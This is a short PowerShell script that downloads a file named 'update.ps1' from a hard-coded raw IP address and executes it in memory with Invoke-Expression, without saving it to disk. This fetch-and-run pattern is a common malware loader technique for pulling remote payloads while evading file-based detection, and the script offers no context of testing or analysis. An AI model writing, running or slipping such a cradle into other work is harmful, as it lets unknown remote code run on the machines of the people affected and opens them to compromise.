#URL of the script to Download
$scriptUrl = "47.148.125.34/update.ps1"

#Download the script content
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)

#Execute the script in memory
Invoke-Expression -Command $scriptContent